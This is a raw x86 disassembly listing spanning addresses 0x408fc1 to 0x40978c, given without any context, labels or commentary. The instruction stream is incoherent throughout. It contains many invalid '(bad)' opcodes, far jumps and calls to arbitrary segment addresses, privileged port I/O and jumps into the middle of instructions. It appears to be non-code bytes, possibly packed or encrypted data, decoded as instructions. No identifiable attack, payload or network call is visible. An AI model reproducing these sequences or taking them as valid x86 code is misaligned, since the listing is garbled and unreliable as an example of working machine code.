  408fc1:	push   esp
  408fc2:	push   edi
  408fc3:	and    dh,BYTE PTR [ecx]
  408fc5:	rcl    DWORD PTR [ecx+0xf],1
  408fc8:	add    DWORD PTR [esi],esp
  408fca:	mov    eax,ds:0x6b0ab826
  408fcf:	aaa    
  408fd0:	add    dl,dl
  408fd2:	push   ds
  408fd3:	fstp   TBYTE PTR [ebx+0x61]
  408fd6:	(bad)  [ecx]
  408fd8:	fistp  WORD PTR [eax]
  408fda:	(bad)  
  408fdb:	mov    al,0x22
  408fdd:	fwait
  408fde:	sub    al,0x3d
  408fe0:	pop    edi
  408fe1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fe2:	das    
  408fe3:	js     0x408f90
  408fe5:	test   eax,0x275d0672
  408fea:	mov    DWORD PTR [edi],esp
  408fec:	xchg   ebx,eax
  408fed:	xchg   BYTE PTR [ecx],dh
  408fef:	in     al,dx
  408ff0:	retf   0x832a
  408ff3:	sub    eax,0x6799b90e
  408ff8:	(bad)  
  408ffa:	jo     0x409058
  408ffc:	pop    edi
  408ffd:	lahf   
  408ffe:	stos   DWORD PTR es:[edi],eax
  408fff:	(bad)  
  409000:	jne    0x408fb9
  409002:	(bad)  
  409003:	inc    esi
  409004:	push   0x2b
  409006:	push   edi
  409007:	(bad)  
  409008:	jle    0x408fcd
  40900a:	xlat   BYTE PTR ds:[ebx]
  40900b:	dec    esp
  40900c:	dec    esi
  40900d:	mov    ecx,0x7a4c3f47
  409012:	jmp    0xdc99:0x34aa
  409018:	or     ah,BYTE PTR [ebp-0x12]
  40901b:	xchg   ebx,eax
  40901c:	xchg   bl,bh
  40901e:	dec    edi
  40901f:	out    dx,eax
  409020:	or     al,ah
  409022:	jnp    0x408fdc
  409024:	cs sti 
  409026:	sbb    al,0x59
  409028:	mov    ?,esi
  40902a:	das    
  40902b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40902c:	xchg   edi,eax
  40902d:	mov    eax,ds:0x9ed771ff
  409032:	mov    es,WORD PTR [ebp+0x5b3e668e]
  409038:	jb     0x40902e
  40903a:	(bad)  
  40903b:	push   edx
  40903c:	loopne 0x409039
  40903e:	xor    ebp,DWORD PTR [ecx-0x41]
  409041:	frstor [esi+0x1d]
  409044:	call   0xd02:0x8e5edc97
  40904b:	or     BYTE PTR [ebp+0x2c],ch
  40904e:	fisubr DWORD PTR [edi-0x59]
  409051:	add    al,0x5
  409053:	inc    ecx
  409054:	fs out dx,eax
  409056:	jmp    0xe27a:0xb1a29fab
  40905d:	inc    esp
  40905e:	ins    BYTE PTR es:[edi],dx
  40905f:	test   BYTE PTR [ebp-0x1891a37e],0xe0
  409066:	xor    BYTE PTR [eax+eiz*1-0x12],0xf2
  40906b:	js     0x40909f
  40906d:	mov    bl,BYTE PTR [edi-0x2a]
  409070:	adc    bh,dh
  409072:	xchg   esp,eax
  409073:	mov    esp,0x7a973a86
  409078:	clc    
  409079:	or     al,BYTE PTR [edx+0x33]
  40907c:	ret    0xe928
  40907f:	mov    cl,0x37
  409081:	dec    edx
  409082:	or     cl,al
  409084:	js     0x40908b
  409086:	arpl   WORD PTR [esi+0x1ed2eeac],bp
  40908c:	jg     0x409085
  40908e:	les    esi,FWORD PTR [ebp+0x15c62845]
  409094:	in     eax,0xb7
  409096:	xor    cl,cl
  409098:	loopne 0x4090b3
  40909a:	les    ebp,FWORD PTR [eax+0xf]
  40909d:	(bad)  
  40909e:	in     eax,0xad
  4090a0:	mov    edx,0x668a3d77
  4090a5:	sbb    DWORD PTR [ebp-0x189ddce6],ebx
  4090ab:	stos   DWORD PTR es:[edi],eax
  4090ac:	test   DWORD PTR [esi+ecx*4+0x54e0c177],ecx
  4090b3:	cmp    DWORD PTR [edi],0xb08a8ba7
  4090b9:	stos   DWORD PTR es:[edi],eax
  4090ba:	cdq    
  4090bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090bc:	sbb    BYTE PTR [esi+eiz*1-0x1758597d],bl
  4090c3:	and    edi,DWORD PTR [eax+0x2f7efca0]
  4090c9:	jo     0x4090e3
  4090cb:	cld    
  4090cc:	and    BYTE PTR [ebx-0x1a23eb04],0x77
  4090d3:	mov    dh,0xd7
  4090d5:	adc    al,0x0
  4090d7:	mov    dl,0xa2
  4090d9:	js     0x40914d
  4090db:	xchg   ebp,eax
  4090dc:	hlt    
  4090dd:	push   esi
  4090de:	ins    BYTE PTR es:[edi],dx
  4090df:	(bad)  
  4090e0:	stos   DWORD PTR es:[edi],eax
  4090e1:	std    
  4090e2:	jmp    0x4090f8
  4090e4:	pushf  
  4090e5:	aam    0x63
  4090e7:	inc    ebp
  4090e8:	jg     0x409144
  4090ea:	cmp    eax,0x3219db05
  4090ef:	fiadd  DWORD PTR [esi]
  4090f1:	leave  
  4090f2:	push   ebx
  4090f3:	mov    edi,0xcb2485da
  4090f8:	cmp    eax,0x901f86fe
  4090fd:	jl     0x4090db
  4090ff:	aas    
  409100:	addr16 mov ds:0x9253,eax
  409104:	mov    WORD PTR [esi],ds
  409106:	sti    
  409107:	xlat   BYTE PTR ds:[ebx]
  409108:	test   al,0xbc
  40910a:	lahf   
  40910b:	imul   esp,DWORD PTR [eax+0x56],0x50957ba1
  409112:	mov    WORD PTR [esi-0x17],?
  409115:	cld    
  409116:	pop    ecx
  409117:	sbb    cl,bh
  409119:	into   
  40911a:	ret    0x52e8
  40911d:	cdq    
  40911e:	mov    dh,0x8f
  409120:	add    dl,bh
  409122:	jbe    0x4090ce
  409124:	cs fcmovnb st,st(5)
  409127:	test   eax,0xee7de3d6
  40912c:	mov    ds:0xd777e031,eax
  409131:	aaa    
  409132:	add    ebp,DWORD PTR [eax]
  409134:	nop
  409135:	and    eax,0x6279f5f4
  40913a:	stos   DWORD PTR es:[edi],eax
  40913b:	pop    eax
  40913c:	fs push 0xfe9492d
  409142:	or     eax,0x4f2efb41
  409147:	pop    es
  409148:	sar    DWORD PTR [esi],0xd6
  40914b:	dec    ebp
  40914c:	sub    ebp,edi
  40914e:	mov    edx,0x37552565
  409153:	pop    ds
  409154:	loop   0x4090ef
  409156:	in     eax,0xdb
  409158:	call   0x61276abb
  40915d:	and    ch,BYTE PTR [edx-0x5e93c9c8]
  409163:	mov    ah,0x75
  409165:	ror    BYTE PTR [ebp-0x46],1
  409168:	xchg   esi,eax
  409169:	shl    DWORD PTR [edx],1
  40916b:	inc    ebp
  40916c:	pop    ebx
  40916d:	inc    eax
  40916e:	enter  0x7f01,0x56
  409172:	jns    0x56a95f45
  409178:	pop    ds
  409179:	mov    ebp,0x5f469bf0
  40917e:	xlat   BYTE PTR ds:[ebx]
  40917f:	or     esp,DWORD PTR [ebx+0x1ab69ac0]
  409185:	popa   
  409186:	sub    BYTE PTR [edi+edi*4+0x3f],dh
  40918a:	push   ss
  40918b:	es cld 
  40918d:	retf   
  40918e:	push   ss
  40918f:	inc    eax
  409190:	sahf   
  409191:	pop    esi
  409192:	or     eax,0xa8670b4c
  409197:	inc    esp
  409198:	jmp    0xd67:0x9fec111f
  40919f:	(bad)  
  4091a1:	xor    al,0xac
  4091a3:	dec    BYTE PTR [esi+0x43]
  4091a6:	aam    0xca
  4091a8:	movsx  esp,si
  4091ab:	or     al,0xc9
  4091ad:	inc    edi
  4091ae:	into   
  4091af:	dec    eax
  4091b0:	js     0x4091d2
  4091b2:	pop    ebx
  4091b3:	not    DWORD PTR [ebp+0x3987433d]
  4091b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091ba:	jnp    0x4091bd
  4091bc:	ins    BYTE PTR es:[edi],dx
  4091bd:	retf   0xd795
  4091c0:	mov    ebp,0x72aa7bc1
  4091c5:	call   0x176f2fa7
  4091ca:	test   eax,0xce6366bc
  4091cf:	shr    DWORD PTR [esi+ebp*2],1
  4091d2:	sti    
  4091d3:	ficomp WORD PTR [eax-0x48]
  4091d6:	adc    al,0xa0
  4091d8:	fwait
  4091d9:	sbb    al,0x3b
  4091db:	jg     0x4091cd
  4091dd:	xchg   ebx,eax
  4091de:	in     eax,0xbf
  4091e0:	mov    ebp,0xbbb584fb
  4091e5:	dec    esi
  4091e6:	popa   
  4091e7:	mov    esp,0xba76ba7
  4091ec:	jns    0x40918a
  4091ee:	cmp    DWORD PTR ds:0x8ba752c7,0x6a8b0d2f
  4091f8:	sub    BYTE PTR [ecx],bl
  4091fa:	jns    0x4091e3
  4091fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091fd:	add    BYTE PTR ds:0xd106a6f2,bh
  409203:	xchg   esp,esp
  409205:	add    eax,0xfaf42940
  40920a:	fisttp WORD PTR [esp+edx*2-0x7f9591b3]
  409211:	sbb    DWORD PTR [eax+0x79],esi
  409214:	jg     0x4091e0
  409216:	xor    eax,0x76db34a3
  40921b:	or     eax,0x6e8021e9
  409220:	out    0xb1,eax
  409222:	cs ins DWORD PTR es:[edi],dx
  409224:	inc    edx
  409225:	add    eax,0xeb4cd3d9
  40922a:	(bad)  
  40922b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40922c:	inc    ebp
  40922d:	sub    eax,ebx
  40922f:	pop    edi
  409230:	inc    esi
  409231:	pop    edx
  409232:	lock pop ebp
  409234:	cdq    
  409235:	in     eax,dx
  409236:	pop    ds
  409237:	mov    di,ax
  40923a:	add    bl,0x83
  40923d:	das    
  40923e:	pop    esi
  40923f:	add    al,0x35
  409241:	sbb    eax,0x86013488
  409246:	test   eax,0xb5128e05
  40924b:	mov    ebx,0x94c30f4d
  409250:	ins    BYTE PTR es:[edi],dx
  409251:	popa   
  409252:	fwait
  409253:	pop    ebx
  409254:	push   eax
  409255:	sbb    eax,0xaf50a07e
  40925a:	adc    dh,BYTE PTR [ebx]
  40925c:	mov    edi,0x21f8b717
  409261:	jge    0x409221
  409263:	inc    esp
  409264:	out    0xb8,al
  409266:	sbb    al,BYTE PTR [edi]
  409268:	imul   eax,DWORD PTR [edi+0x9],0xc35c72e9
  40926f:	mov    bl,dl
  409271:	push   edi
  409272:	cli    
  409273:	lods   al,BYTE PTR es:[esi]
  409275:	pop    ss
  409276:	pusha  
  409277:	fld    TBYTE PTR [ecx+0x3b55d70a]
  40927d:	popa   
  40927e:	lahf   
  40927f:	imul   ebx,edx,0x7883a7b
  409285:	js     0x409259
  409287:	enter  0x8b99,0xe1
  40928b:	ins    BYTE PTR es:[edi],dx
  40928c:	cmp    BYTE PTR [edx+0x1c],ch
  40928f:	ins    BYTE PTR es:[edi],dx
  409290:	or     dh,BYTE PTR [esp+ecx*1-0x1bfa55b6]
  409297:	add    ch,BYTE PTR [ecx+ebx*8-0x5d03a692]
  40929e:	or     dl,al
  4092a0:	rol    BYTE PTR [ebx-0x66212eec],cl
  4092a6:	hlt    
  4092a7:	cwde   
  4092a8:	popa   
  4092a9:	or     dh,ch
  4092ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092ac:	pop    esp
  4092ad:	out    dx,al
  4092ae:	xchg   edi,eax
  4092af:	sahf   
  4092b0:	ins    BYTE PTR es:[edi],dx
  4092b1:	mov    ds:0xf68715f6,eax
  4092b6:	aas    
  4092b7:	int3   
  4092b8:	idiv   DWORD PTR [edi+0x71]
  4092bb:	and    bh,dh
  4092bd:	pop    ss
  4092be:	sar    DWORD PTR [eax-0x57b9d794],0x48
  4092c5:	inc    ebp
  4092c6:	iret   
  4092c7:	jg     0x4092e7
  4092c9:	dec    esi
  4092ca:	into   
  4092cb:	dec    ebx
  4092cc:	cmp    dh,BYTE PTR [edx-0x7f]
  4092cf:	sbb    BYTE PTR [esi],0x89
  4092d2:	mov    dh,0x52
  4092d4:	push   cs
  4092d5:	stc    
  4092d6:	aaa    
  4092d7:	pop    esi
  4092d8:	aam    0x23
  4092da:	or     dh,BYTE PTR [ecx]
  4092dc:	int3   
  4092dd:	sub    eax,0x305d5cae
  4092e2:	inc    esi
  4092e3:	ficomp WORD PTR [eax+0x6b]
  4092e6:	pop    esi
  4092e7:	pop    edi
  4092e8:	leave  
  4092e9:	cld    
  4092ea:	dec    edi
  4092eb:	mov    BYTE PTR [eax],cl
  4092ed:	cli    
  4092ee:	stc    
  4092ef:	lods   eax,DWORD PTR ds:[esi]
  4092f0:	push   esp
  4092f2:	sti    
  4092f3:	pop    ecx
  4092f4:	fiadd  DWORD PTR [edx-0x74]
  4092f7:	jnp    0x4092ef
  4092f9:	sbb    BYTE PTR [edi],ch
  4092fb:	cmp    ecx,esp
  4092fd:	rol    DWORD PTR [eax],1
  4092ff:	or     dl,ah
  409301:	push   ebp
  409302:	or     ecx,DWORD PTR [ecx+esi*2]
  409305:	sahf   
  409306:	cmp    ah,BYTE PTR [ebx-0x4b]
  409309:	cmp    al,0x6d
  40930b:	mov    bl,0x7c
  40930d:	cld    
  40930e:	das    
  40930f:	rcr    ah,1
  409311:	cs adc ecx,edi
  409314:	popf   
  409315:	(bad)  
  409316:	daa    
  409317:	inc    DWORD PTR es:[ebx+0x40a287cd]
  40931e:	jo     0x409389
  409320:	adc    cl,ah
  409322:	push   0xadae1b60
  409327:	fnstenv [edx+0x6e44e50f]
  40932d:	cli    
  40932e:	adc    cl,BYTE PTR [ebx]
  409330:	pop    ecx
  409331:	add    BYTE PTR [esi+0x197676fb],0xe2
  409338:	push   esp
  409339:	aad    0x7c
  40933b:	div    BYTE PTR [esi]
  40933d:	out    dx,al
  40933e:	retf   
  40933f:	arpl   WORD PTR [edi],ax
  409341:	cmp    cl,ch
  409343:	retf   0x640e
  409346:	sbb    eax,0x7ad60898
  40934b:	sbb    DWORD PTR [eax],0x66
  40934e:	inc    ecx
  40934f:	pushf  
  409350:	mov    ebp,0x76c56401
  409355:	aaa    
  409356:	or     edx,0x3c
  409359:	cdq    
  40935a:	or     al,0xf5
  40935c:	xlat   BYTE PTR ds:[ebx]
  40935d:	or     eax,0x34ebf9b2
  409362:	mov    al,ds:0xea2955b5
  409367:	add    esi,DWORD PTR [ebx+0x17]
  40936a:	jmp    0x56e1:0x16c59dff
  409371:	and    ch,BYTE PTR [esp+esi*1+0x14]
  409375:	pop    ss
  409376:	pushf  
  409377:	sub    ah,dh
  409379:	jmp    0xa6d84d51
  40937e:	xor    eax,0xafa5b242
  409383:	mov    bl,0x2c
  409385:	inc    ebp
  409386:	daa    
  409387:	push   edi
  409388:	and    eax,0x999e4de8
  40938d:	dec    edi
  40938e:	push   edx
  40938f:	int3   
  409390:	or     al,BYTE PTR [ebp+0x57c056e4]
  409396:	scas   eax,DWORD PTR es:[edi]
  409397:	ss ins BYTE PTR es:[edi],dx
  409399:	push   esi
  40939a:	xor    al,0x73
  40939c:	enter  0x1d5b,0xc9
  4093a0:	and    esi,DWORD PTR [ebx-0x386ea711]
  4093a6:	inc    esi
  4093a7:	test   DWORD PTR [ecx-0x46],0x999b1a1
  4093ae:	mov    dl,0x33
  4093b0:	aam    0xbd
  4093b2:	std    
  4093b3:	in     eax,dx
  4093b4:	enter  0x535d,0x5f
  4093b8:	gs (bad) 
  4093ba:	push   0x44
  4093bc:	jo     0x4093ab
  4093be:	push   esi
  4093bf:	pop    edi
  4093c0:	(bad)  
  4093c1:	sbb    al,0x74
  4093c3:	mov    al,ds:0xb54749f7
  4093c8:	xchg   esi,eax
  4093c9:	cwde   
  4093ca:	sub    eax,DWORD PTR [edi+ecx*1-0x655b53ea]
  4093d1:	mov    dh,0x56
  4093d3:	and    al,0x16
  4093d5:	pop    eax
  4093d6:	sub    edi,DWORD PTR [eax+0x6cf0904c]
  4093dc:	push   ss
  4093dd:	loopne 0x409439
  4093df:	sbb    al,BYTE PTR [eax+0x68]
  4093e2:	cmp    BYTE PTR [edi-0x7a],dh
  4093e5:	jecxz  0x40936d
  4093e7:	imul   edi,edi,0xe
  4093ea:	mov    dh,0xbf
  4093ec:	aam    0xea
  4093ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093ef:	loopne 0x40938f
  4093f1:	sbb    al,0x26
  4093f3:	mov    ds,WORD PTR [edx+0x6913e3]
  4093f9:	mov    ah,0xd7
  4093fb:	sub    al,0x85
  4093fd:	ss mov edx,0xd24f3583
  409403:	dec    edi
  409404:	ret    0xe8b6
  409407:	in     al,dx
  409408:	retf   0x8646
  40940b:	push   ds
  40940c:	jp     0x4093c4
  40940e:	xor    eax,0x329f8478
  409413:	je     0x409488
  409415:	cmc    
  409416:	mov    bl,0x54
  409418:	aaa    
  409419:	add    al,0x65
  40941b:	mov    ss,WORD PTR [edi+0x4b]
  40941e:	and    bh,BYTE PTR [edi]
  409420:	mov    bl,0xc
  409422:	in     al,dx
  409423:	lods   al,BYTE PTR ds:[esi]
  409424:	fldcw  WORD PTR [edx-0xa]
  409427:	sub    esi,DWORD PTR [edx]
  409429:	in     al,0x48
  40942b:	fst    DWORD PTR [ebp+0x5aad0269]
  409431:	pop    esp
  409432:	cld    
  409433:	(bad)  [esi+0x6de843eb]
  409439:	dec    esp
  40943a:	out    dx,al
  40943b:	ret    0xc622
  40943e:	push   edi
  40943f:	dec    ebp
  409440:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  409442:	push   0xd4461a12
  409447:	add    cl,BYTE PTR [esi+0x504aa1d4]
  40944d:	icebp  
  40944e:	and    bl,BYTE PTR [esp+eiz*2-0x71226c1c]
  409455:	scas   al,BYTE PTR es:[edi]
  409456:	int    0x43
  409458:	push   es
  409459:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40945a:	sbb    al,BYTE PTR [edi-0x19]
  40945d:	lock push 0x36
  409460:	inc    edx
  409461:	inc    eax
  409462:	cmp    ah,BYTE PTR [esi]
  409464:	loop   0x4093f7
  409466:	scas   eax,DWORD PTR es:[edi]
  409467:	out    0x9c,eax
  409469:	cs not esp
  40946c:	in     al,0x1c
  40946e:	xchg   ebx,eax
  40946f:	cs pusha 
  409471:	cmp    eax,0x90ec5f0a
  409476:	sbb    eax,0x973b71a5
  40947b:	adc    DWORD PTR [ecx],0x68
  40947e:	bound  ecx,QWORD PTR ds:0xe8efe7a3
  409484:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409485:	jno    0x40947e
  409487:	xor    DWORD PTR [edx+0x3d],edi
  40948a:	sub    eax,0x359e61a1
  40948f:	loopne 0x409469
  409491:	stc    
  409492:	ja     0x40945f
  409494:	aas    
  409495:	inc    edi
  409496:	enter  0xb411,0x96
  40949a:	dec    esi
  40949b:	mov    ecx,0xe85e79dd
  4094a0:	add    BYTE PTR fs:[edi-0x4293c9ec],al
  4094a7:	popf   
  4094a8:	call   0x760:0x8283e65c
  4094af:	adc    bl,BYTE PTR [ecx]
  4094b1:	jns    0x409461
  4094b3:	add    eax,0x206f483f
  4094b8:	mov    eax,0x6ccbc919
  4094bd:	pop    ecx
  4094be:	and    ah,cl
  4094c0:	push   cs
  4094c1:	in     eax,dx
  4094c2:	loop   0x409470
  4094c4:	push   edx
  4094c5:	adc    ch,BYTE PTR [eax-0x661d84b5]
  4094cb:	mov    al,0x98
  4094cd:	fdiv   QWORD PTR [ebp-0x20636d9c]
  4094d3:	fs popa 
  4094d5:	xor    eax,DWORD PTR ds:[eax-0x2ea124c4]
  4094dc:	dec    esi
  4094dd:	add    bh,BYTE PTR [ecx+ecx*4+0x25]
  4094e1:	in     eax,0xca
  4094e3:	adc    eax,0xe549b56d
  4094e8:	xor    bh,BYTE PTR [ebx+ebp*8]
  4094eb:	dec    edx
  4094ec:	enter  0x7830,0xe2
  4094f0:	int    0x28
  4094f2:	bound  ebp,QWORD PTR [ecx]
  4094f4:	in     al,dx
  4094f5:	mov    fs,WORD PTR [edi-0x79]
  4094f8:	outs   dx,BYTE PTR ds:[esi]
  4094f9:	mov    DWORD PTR [eax-0x6cdec036],ebp
  4094ff:	push   es
  409500:	jecxz  0x40948c
  409502:	nop
  409503:	push   es
  409504:	cwde   
  409505:	cmp    ecx,DWORD PTR [ecx]
  409507:	adc    BYTE PTR [edi-0x5e],ch
  40950a:	push   0x56479a36
  40950f:	sub    BYTE PTR [ecx-0x14],al
  409512:	mov    ds:0x8c3a9756,al
  409517:	jl     0x4094e6
  409519:	and    eax,0x5472ba1c
  40951e:	fist   WORD PTR [edi-0x7c647dec]
  409524:	rep ins DWORD PTR es:[edi],dx
  409526:	sbb    al,0x60
  409528:	mov    edx,DWORD PTR [eax-0x1]
  40952b:	bound  eax,QWORD PTR [edi+0x4]
  40952e:	sbb    al,0x3b
  409530:	scas   eax,DWORD PTR es:[edi]
  409531:	mov    edx,0x8a0deb63
  409536:	sti    
  409537:	mov    bl,0x96
  409539:	jnp    0x4094e0
  40953b:	ins    DWORD PTR es:[edi],dx
  40953c:	fsubr  QWORD PTR [esi-0x3854ad4c]
  409542:	dec    ebx
  409543:	fild   WORD PTR [edx]
  409545:	cwde   
  409546:	sbb    eax,DWORD PTR [ebp+edx*4+0x5]
  40954a:	dec    ebp
  40954b:	jl     0x4094f3
  40954d:	adc    BYTE PTR [ecx-0x618ad606],dh
  409553:	in     eax,dx
  409554:	mov    BYTE PTR [ecx+0x4d],ch
  409557:	pop    es
  409558:	cmc    
  409559:	cmp    eax,0x8cb9937f
  40955e:	std    
  40955f:	mov    ds:0x4091d336,eax
  409564:	dec    bh
  409566:	add    eax,eax
  409568:	inc    esi
  409569:	pop    esp
  40956a:	ins    BYTE PTR es:[edi],dx
  40956b:	xchg   ecx,eax
  40956c:	push   ds
  40956d:	and    dl,ah
  40956f:	stos   DWORD PTR es:[edi],eax
  409570:	cdq    
  409571:	pop    esi
  409572:	loopne 0x409555
  409574:	fs out dx,eax
  409576:	add    bl,bh
  409578:	jmp    0x34eb:0x74ca9c22
  40957f:	xchg   BYTE PTR [esi],bh
  409581:	dec    esi
  409582:	mov    eax,0xa43eb0ef
  409587:	add    BYTE PTR [edi+0x7b3eb2a1],bl
  40958d:	fs mov bh,0xf9
  409590:	mov    ah,0x74
  409592:	mov    DWORD PTR [edi-0x14866ecd],edi
  409598:	sbb    al,0xd
  40959a:	jmp    0x6cf959fa
  40959f:	outs   dx,BYTE PTR ds:[esi]
  4095a0:	jmp    0x418c426e
  4095a5:	jno    0x4095d1
  4095a7:	jl     0x4095b5
  4095a9:	in     al,dx
  4095aa:	sbb    BYTE PTR [eax+0x46e5cf1e],dh
  4095b0:	push   esi
  4095b1:	mov    dh,0xdf
  4095b3:	xlat   BYTE PTR ds:[ebx]
  4095b4:	xlat   BYTE PTR ds:[ebx]
  4095b5:	or     al,0x5
  4095b7:	jp     0x4095ff
  4095b9:	ins    BYTE PTR es:[edi],dx
  4095ba:	mov    eax,0x847219a3
  4095bf:	and    BYTE PTR [edx-0x2d39144d],ah
  4095c5:	mov    al,0xeb
  4095c7:	out    dx,eax
  4095c8:	ret    
  4095c9:	jl     0x409646
  4095cb:	and    esp,DWORD PTR [esi+0xb26c736]
  4095d1:	outs   dx,DWORD PTR ds:[esi]
  4095d2:	and    BYTE PTR [ecx+0x38d65452],ch
  4095d8:	por    mm1,QWORD PTR [esi]
  4095db:	xor    dh,BYTE PTR [ecx+ebx*1+0x3430fdba]
  4095e2:	les    ebp,FWORD PTR [ebx]
  4095e4:	jns    0x4095d7
  4095e6:	(bad)  
  4095e7:	(bad)  
  4095e8:	in     al,0xe2
  4095ea:	mov    ch,0xd8
  4095ec:	adc    esp,edx
  4095ee:	add    esp,DWORD PTR [eax+0x46]
  4095f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095f2:	mov    ch,0xcc
  4095f4:	xchg   ebp,eax
  4095f5:	test   edi,ebp
  4095f7:	(bad)  
  4095f8:	scas   al,BYTE PTR es:[edi]
  4095f9:	xor    eax,DWORD PTR [eax-0x5801b6f0]
  4095ff:	mov    dh,0xcf
  409601:	push   esp
  409602:	bound  esp,QWORD PTR [esi+eax*1+0x7b6ebbd1]
  409609:	fwait
  40960a:	pop    ecx
  40960b:	mov    dl,BYTE PTR [edi]
  40960d:	pop    edi
  40960e:	sbb    DWORD PTR [esi+0x7f],edx
  409611:	je     0x409602
  409613:	hlt    
  409614:	jmp    0x4f98e312
  409619:	mov    ds:0xf000cfea,al
  40961e:	xchg   edx,eax
  40961f:	jb     0x40969b
  409621:	data16 adc al,0xd4
  409624:	leave  
  409625:	jae    0x409635
  409627:	push   esp
  409628:	fwait
  409629:	mov    esp,0xdc0d5848
  40962e:	adc    al,0x85
  409630:	and    dh,BYTE PTR [ecx-0x18]
  409633:	aam    0xa6
  409635:	retf   
  409636:	and    esp,0xffffffdb
  409639:	call   0x46ed4bae
  40963e:	jmp    0x40966a
  409640:	(bad)
  409643:	pop    es
  409644:	inc    ebx
  409645:	mov    ds:0xd063b502,eax
  40964a:	and    ch,BYTE PTR [eax-0x22]
  40964d:	(bad)  
  40964e:	sahf   
  40964f:	sti    
  409650:	lods   al,BYTE PTR ds:[esi]
  409651:	ds add al,0xb2
  409654:	jg     0x4096c8
  409656:	mov    BYTE PTR [esi],bl
  409658:	lods   eax,DWORD PTR ds:[esi]
  409659:	xchg   edi,eax
  40965a:	adc    DWORD PTR [esi],esp
  40965c:	repnz adc al,0x5d
  40965f:	pop    eax
  409660:	loope  0x409620
  409662:	imul   edx,DWORD PTR [ecx-0xc],0xffffffce
  409666:	dec    eax
  409667:	inc    edi
  409668:	ret    0xb7d6
  40966b:	jbe    0x409662
  40966d:	sbb    BYTE PTR [eax+0x8a57fbc],ah
  409673:	push   es
  409674:	outs   dx,BYTE PTR ds:[esi]
  409675:	enter  0x25c9,0xbb
  409679:	or     esp,edi
  40967b:	shr    DWORD PTR [edx],0x33
  40967e:	fld    QWORD PTR [edi+0x52]
  409681:	sub    al,0x68
  409683:	outs   dx,DWORD PTR ds:[esi]
  409684:	aam    0x8a
  409686:	out    dx,eax
  409687:	fldcw  WORD PTR ds:0xc5ac0fcd
  40968d:	ds repz repnz int3 
  409691:	adc    al,0x16
  409693:	adc    BYTE PTR [ebx-0x56],bl
  409696:	jmp    0xdeaf2f00
  40969b:	mov    esp,ecx
  40969d:	mov    al,0xca
  40969f:	add    al,0xa0
  4096a1:	es ret 0x7628
  4096a5:	and    bl,BYTE PTR [edx+0x26]
  4096a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096a9:	sbb    DWORD PTR [ebp+0x4ddfbab3],edi
  4096af:	xor    al,0xc7
  4096b1:	js     0x40964c
  4096b3:	in     eax,0x5c
  4096b5:	(bad)  
  4096b6:	jo     0x40967a
  4096b8:	sub    ch,BYTE PTR [edx+eax*8+0x78da9bf]
  4096bf:	rol    cl,0xed
  4096c2:	xchg   BYTE PTR [ecx],dh
  4096c4:	jl     0x4096ea
  4096c6:	fidivr DWORD PTR ds:[edi+0x48023a8b]
  4096cd:	lea    edx,[edi+0x24]
  4096d0:	nop
  4096d1:	inc    esp
  4096d2:	or     DWORD PTR [ecx-0x4bbb84c8],ebp
  4096d8:	daa    
  4096d9:	mov    eax,0x211a08d6
  4096de:	dec    esp
  4096df:	(bad)  
  4096e1:	fs out dx,eax
  4096e3:	into   
  4096e4:	imul   ebx,ebx,0x1b4511
  4096ea:	pushf  
  4096eb:	(bad)  [ecx+0x4d]
  4096ee:	test   al,0xe6
  4096f0:	(bad)  
  4096f1:	inc    esp
  4096f2:	into   
  4096f3:	pusha  
  4096f4:	ret    
  4096f5:	outs   dx,BYTE PTR ds:[esi]
  4096f6:	loop   0x409697
  4096f8:	out    0x89,eax
  4096fa:	call   0xa441d8b
  4096ff:	js     0x40968d
  409701:	push   ds
  409702:	or     BYTE PTR [ebx],bl
  409704:	loop   0x4096ab
  409706:	lods   eax,DWORD PTR ds:[esi]
  409707:	mov    DWORD PTR [eax],edi
  409709:	stos   DWORD PTR es:[edi],eax
  40970a:	mov    dh,0x6
  40970c:	mov    al,0x2
  40970e:	add    BYTE PTR [edi+0x4237aaf6],al
  409714:	(bad)  
  409715:	mov    ds:0xd1153730,al
  40971a:	and    DWORD PTR [ecx],eax
  40971c:	sub    DWORD PTR [ecx],edi
  40971e:	lods   eax,DWORD PTR ds:[esi]
  40971f:	call   0x59f4:0x171ec37e
  409726:	and    ecx,DWORD PTR [esi]
  409728:	pop    ecx
  409729:	int    0xc9
  40972b:	loopne 0x4096b1
  40972d:	jge    0x409736
  40972f:	cmc    
  409730:	cmp    ch,bh
  409732:	inc    eax
  409733:	lahf   
  409734:	mul    BYTE PTR [esi]
  409736:	push   esp
  409737:	dec    edx
  409738:	mov    dh,0x71
  40973a:	js     0x40978b
  40973c:	xchg   DWORD PTR [ecx],edx
  40973e:	mov    ds:0x2c001d8f,al
  409743:	(bad)  
  409744:	dec    ebp
  409745:	aaa    
  409746:	sar    DWORD PTR [ecx-0x78],1
  409749:	ja     0x4096fb
  40974b:	lahf   
  40974c:	not    DWORD PTR ds:0x93ffd392
  409752:	pop    es
  409753:	fld    TBYTE PTR [eax]
  409755:	and    DWORD PTR ds:0x63f34f36,0xc89d6d6e
  40975f:	aas    
  409760:	je     0x40979e
  409762:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409763:	inc    ebx
  409764:	aam    0xdf
  409766:	xchg   DWORD PTR [ebp+0x60],esi
  409769:	int3   
  40976a:	add    al,0x8c
  40976c:	pop    ss
  40976d:	lods   eax,DWORD PTR ds:[esi]
  40976e:	mov    ah,0x79
  409770:	push   0x3aae979
  409775:	retf   0x98e
  409778:	jp     0x40976b
  40977a:	sbb    al,0x8d
  40977c:	cmp    edi,edi
  40977e:	iret   
  40977f:	int    0x90
  409781:	fsub   st,st(6)
  409783:	inc    ebp
  409784:	or     esi,DWORD PTR [edi-0x72]
  409787:	je     0x40971d
  409789:	inc    ebx
  40978a:	mov    bh,0xb0
  40978c:	sbb    cl,al
